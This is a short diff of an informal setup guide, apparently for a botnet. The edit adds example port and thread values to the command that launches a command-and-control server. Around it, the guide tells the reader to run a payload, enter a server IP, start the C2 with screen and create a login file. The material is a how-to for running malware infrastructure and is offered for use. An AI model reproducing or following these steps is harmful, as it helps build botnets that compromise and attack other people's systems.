@@ -25,7 +25,7 @@ once done. do ./payload
 type in your server ip and wallah done
 
 now just go into cnc directory by doing cd cnc
-then final command is screen ./cnc <bot-port> <threads> <cnc-port> 
+then final command is screen ./cnc <bot-port> <threads> <cnc-port> (screen ./cnc 6969 100 420)
 (botport is the port in the main.c right next to the ip)
 (cncport is the port you connect with)
 and don't forget to make your login in login.txt!
